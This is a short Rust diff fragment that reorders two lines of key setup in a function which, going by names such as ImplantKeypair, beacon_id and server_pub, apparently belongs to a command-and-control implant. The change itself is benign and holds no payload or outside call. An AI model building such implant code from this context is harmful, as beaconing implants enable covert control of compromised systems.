@@ -37,8 +37,8 @@ pub struct Config {
 
 pub fn run(cfg: Config) -> anyhow::Result<()> {
     let kp = ImplantKeypair::generate();
-    let key = kp.session_key(&cfg.server_pub);
     let pubkey = kp.public_bytes();
+    let key = kp.session_key(&cfg.server_pub);
     let beacon_id: u32 = rand::random();
 
     // Resolve the server-side response envelope (the transform chain the server
